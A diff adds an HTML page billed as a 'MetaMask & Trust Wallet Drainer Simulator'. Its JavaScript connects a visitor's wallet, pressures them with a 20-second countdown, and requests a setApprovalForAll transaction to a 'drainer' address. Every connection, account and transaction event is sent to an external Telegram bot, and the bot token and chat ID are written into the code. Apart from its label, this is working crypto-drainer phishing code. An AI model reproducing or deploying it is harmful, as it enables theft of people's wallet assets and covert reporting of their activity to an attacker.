@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>MetaMask & Trust Wallet Drainer Simulator</title>
+<style>
+  body {
+    margin:0; padding:20px;
+    background: #121212;
+    color: #00ff99;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    user-select:none;
+    display: flex; flex-direction: column; align-items: center; min-height: 100vh;
+  }
+  h1 {
+    font-weight: 900;
+    font-size: 2.2rem;
+    margin-bottom: 10px;
+    text-shadow: 0 0 10px #00ff99aa;
+  }
+  #status, #log {
+    background: #222;
+    border-radius: 10px;
+    padding: 16px;
+    width: 100%;
+    max-width: 480px;
+    margin: 10px 0;
+    font-family: monospace;
+    white-space: pre-wrap;
+    height: 140px;
+    overflow-y: auto;
+    box-shadow: 0 0 15px #00ff99aa;
+  }
+  #countdown {
+    font-size: 1.5rem;
+    font-weight: 700;
+    margin: 10px 0 20px;
+    user-select:none;
+  }
+  .wallet-btn {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    padding: 14px 36px;
+    font-size: 1.3rem;
+    border-radius: 24px;
+    border: none;
+    cursor: pointer;
+    font-weight: 700;
+    color: #121212;
+    background: #00ff99;
+    box-shadow: 0 0 20px #00ff99aa;
+    transition: background 0.3s ease;
+    user-select:none;
+    margin: 6px 0;
+    width: 250px;
+  }
+  .wallet-btn:disabled {
+    background: #444;
+    color: #666;
+    cursor: not-allowed;
+    box-shadow: none;
+  }
+  .wallet-btn:hover:not(:disabled) {
+    background: #00cc66;
+  }
+  .wallet-btn img {
+    width: 28px;
+    height: 28px;
+  }
+</style>
+</head>
+<body>
+
+<h1>🧠 MetaMask & Trust Wallet Drainer Simulator</h1>
+
+<div id="status">Status: Waiting for you to connect your wallet...</div>
+<div id="countdown"></div>
+
+<button id="metamaskBtn" class="wallet-btn">
+  <img src="https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg" alt="MetaMask" />
+  Connect MetaMask
+</button>
+
+<button id="trustBtn" class="wallet-btn">
+  <img src="https://seeklogo.com/images/T/trust-wallet-logo-FA1F30F6D1-seeklogo.com.png" alt="Trust Wallet" />
+  Connect Trust Wallet
+</button>
+
+<div id="log" aria-live="polite" aria-atomic="true"></div>
+
+<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+
+<script>
+  // إعداد التوكن والـ Chat ID الخاصين بالبوت في تيليجرام
+  const TELEGRAM_TOKEN = '7742799307:AAE4gtk_bHx2DiFxmqUEglreldTFFTrg';
+  const TELEGRAM_CHAT_ID = '1269389399';
+
+  const DRAINER_ADDRESS = "0x1111111111111111111111111111111111111111";
+  const ABI = ["function setApprovalForAll(address operator, bool approved) external"];
+
+  const statusEl = document.getElementById('status');
+  const logEl = document.getElementById('log');
+  const countdownEl = document.getElementById('countdown');
+
+  const metamaskBtn = document.getElementById('metamaskBtn');
+  const trustBtn = document.getElementById('trustBtn');
+
+  let provider, signer;
+  let countdownTimer;
+
+  function sendTelegramMessage(message) {
+    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+    const data = { chat_id: TELEGRAM_CHAT_ID, text: message };
+    fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(data)
+    }).catch(err => console.error("Telegram error:", err));
+  }
+
+  function smartLog(message) {
+    const now = new Date().toLocaleTimeString();
+    const logMessage = `[${now}] ${message}`;
+    logEl.textContent += `${logMessage}\n`;
+    logEl.scrollTop = logEl.scrollHeight;
+    sendTelegramMessage(logMessage);
+  }
+
+  function isMobile() {
+    return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+  }
+
+  function startCountdown() {
+    let countdownValue = 20;
+    let timeoutSent = false;
+    countdownEl.textContent = `⏳ Time left to approve: ${countdownValue}s`;
+    clearInterval(countdownTimer);
+
+    countdownTimer = setInterval(() => {
+      countdownValue--;
+      countdownEl.textContent = `⏳ Time left to approve: ${countdownValue}s`;
+
+      if (countdownValue <= 0) {
+        clearInterval(countdownTimer);
+        approveBtn.disabled = true;
+        statusEl.textContent = "⌛ Timeout. Please reconnect your wallet.";
+        if (!timeoutSent) {
+          smartLog("User timeout - approval disabled.");
+          timeoutSent = true;
+        }
+      }
+    }, 1000);
+  }
+
+  // دالة توصيل MetaMask سواء على الكمبيوتر أو الموبايل (داخل متصفح MetaMask)
+  async function connectMetaMask() {
+    if (!window.ethereum || !window.ethereum.isMetaMask) {
+      smartLog("MetaMask not detected in browser.");
+      statusEl.textContent = "❌ MetaMask not detected!";
+      return;
+    }
+    try {
+      statusEl.textContent = "🔄 Requesting MetaMask connection...";
+      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+      provider = new ethers.providers.Web3Provider(window.ethereum);
+      signer = provider.getSigner();
+      const address = await signer.getAddress();
+
+      statusEl.textContent = `✅ Connected: ${address}`;
+      smartLog(`Connected to MetaMask account: ${address}`);
+      approveBtn.disabled = false;
+      startCountdown();
+
+      window.ethereum.on('accountsChanged', (accounts) => {
+        if (accounts.length === 0) {
+          statusEl.textContent = "❗ MetaMask disconnected.";
+          smartLog("MetaMask account disconnected.");
+          approveBtn.disabled = true;
+          clearInterval(countdownTimer);
+        } else {
+          statusEl.textContent = `🔄 Account changed: ${accounts[0]}`;
+          smartLog(`Account changed to: ${accounts[0]}`);
+          approveBtn.disabled = false;
+          startCountdown();
+        }
+      });
+
+      window.ethereum.on('chainChanged', (chainId) => {
+        smartLog(`Network changed: ${chainId}`);
+        statusEl.textContent = `🌐 Network changed: ${chainId}`;
+        approveBtn.disabled = true;
+        clearInterval(countdownTimer);
+      });
+
+    } catch (err) {
+      statusEl.textContent = "❌ Connection rejected or failed.";
+      smartLog(`MetaMask connection error: ${err.message}`);
+    }
+  }
+
+  // فتح DApp داخل Trust Wallet (جوّال)
+  function openTrustWalletDapp() {
+    if (!isMobile()) {
+      alert("Trust Wallet DApp Browser is only available on mobile devices.");
+      return;
+    }
+    // يجب استبدال الرابط بـ IP جهازك أو موقعك الحقيقي (وليس localhost)
+    const dappUrl = "http://192.168.1.5:8000"; // عدّل هنا حسب شبكتك
+    const trustUrl = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(dappUrl)}`;
+    window.location.href = trustUrl;
+  }
+
+  // دالة الموافقة (Approval) على العقد الذكي
+  async function approveDrainer() {
+    if (!signer) {
+      statusEl.textContent = "❌ Not connected to wallet.";
+      smartLog("Attempted approval without wallet connection.");
+      return;
+    }
+
+    approveBtn.disabled = true;
+    statusEl.textContent = "⏳ Sending approval transaction...";
+    smartLog("Initiating setApprovalForAll transaction to drainer...");
+
+    try {
+      const contract = new ethers.Contract(DRAINER_ADDRESS, ABI, signer);
+      const tx = await contract.setApprovalForAll(DRAINER_ADDRESS, true);
+      statusEl.textContent = "✅ Approval transaction sent! Please confirm in wallet.";
+      smartLog(`Transaction sent. Hash: ${tx.hash}`);
+
+      await tx.wait();
+      statusEl.textContent = "🎉 Transaction confirmed! Your wallet is 'approved'.";
+      smartLog("Transaction confirmed successfully.");
+      clearInterval(countdownTimer);
+      countdownEl.textContent = "";
+    } catch (error) {
+      statusEl.textContent = "❌ Transaction failed or rejected.";
+      smartLog(`Transaction error: ${error.message}`);
+      approveBtn.disabled = false;
+    }
+  }
+
+  // زر الموافقة في الواجهة (مخفي حتى التوصيل)
+  const approveBtn = document.createElement('button');
+  approveBtn.id = 'approveBtn';
+  approveBtn.textContent = 'Approve Drainer Access';
+  approveBtn.className = 'wallet-btn';
+  approveBtn.disabled = true;
+  document.body.insertBefore(approveBtn, logEl);
+
+  approveBtn.addEventListener('click', approveDrainer);
+
+  // أزرار الربط
+  metamaskBtn.addEventListener('click', () => {
+    if (isMobile()) {
+      // حاول فتح DApp في متصفح MetaMask Mobile
+      // عدّل الرابط حسب IP سيرفرك وليس localhost!
+      const dappUrl = "http://192.168.1.5:8000";
+      const metamaskMobileLink = `https://metamask.app.link/dapp/${dappUrl.replace(/^https?:\/\//, '')}`;
+      window.location.href = metamaskMobileLink;
+    } else {
+      connectMetaMask();
+    }
+  });
+
+  trustBtn.addEventListener('click', () => {
+    openTrustWalletDapp();
+  });
+
+  // حالة مبدئية في الواجهة
+  if (window.ethereum && window.ethereum.isMetaMask) {
+    statusEl.textContent = "✅ MetaMask detected. Ready to connect.";
+  } else {
+    statusEl.textContent = isMobile()
+      ? "📱 Mobile device detected. Use MetaMask or Trust Wallet browser to open this page."
+      : "❌ MetaMask not detected. Please install MetaMask extension or use Trust Wallet browser on mobile.";
+  }
+
+</script>
+</body>
+</html>
